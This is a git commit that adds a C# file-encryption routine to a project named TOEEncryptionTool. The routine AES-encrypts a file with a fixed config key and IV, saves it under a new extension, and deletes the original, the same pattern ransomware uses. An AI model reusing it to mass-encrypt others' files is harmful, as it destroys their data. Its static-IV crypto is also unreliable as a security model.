01652f2fea1c69c2d1a3993024525b605725500a
naomi <116236871+CementMix3r@users.noreply.github.com>
2024-04-21 20:12:09 +0100

    Fixed Decryption
    fixed decryption, it didnt have the IV being the same using cbc mode

---
+++ TOEEncryptionTool/CryptIO.cs
@@ -0,0 +1,71 @@
+﻿using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace TOEEncryptionTool
+{
+    internal class CryptIO
+    {
+        // Encrypt File
+        internal static bool Cry(string file)
+        {
+            try
+            {
+                using (RijndaelManaged aes = new RijndaelManaged())
+                {
+                    aes.KeySize = 256;
+                    aes.BlockSize = 128;
+                    aes.Mode = CipherMode.CBC;
+                    aes.Key = Encoding.UTF8.GetBytes(Config.Key);
+                    aes.IV = Encoding.UTF8.GetBytes(Config.IV);
+                    aes.Padding = PaddingMode.PKCS7;
+
+                    ICryptoTransform e = aes.CreateEncryptor();
+
+                    string encFile = file + Config.ext;
+
+                    using (FileStream fsEn = new FileStream(file, FileMode.Open))
+                    {
+                        using (FileStream fsEnCrypt = new FileStream(encFile, FileMode.Create))
+                        {
+                            using (CryptoStream cs = new CryptoStream(fsEnCrypt, e, CryptoStreamMode.Write))
+                            {
+                                int data;
+
+                                while ((data = fsEn.ReadByte()) != -1)
+                                {
+                                    cs.WriteByte((byte)data);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            catch (Exception e)
+            {
+                Logger.LogError("Could not encrypt file: " + e.ToString());
+                return false;
+            }
+
+            return true;
+        }
+
+
+        //Handle Encrypt File
+        internal static void EncryptFile(string file)
+        {
+            // If Cry function returns true then delete the original file
+            if (Cry(file))
+            {
+                File.Delete(file);
+            }
+
+            else
+            {
+                Logger.LogError($"Failed to Encrypt File: {file}");
+            }
+        }
+    }
+}
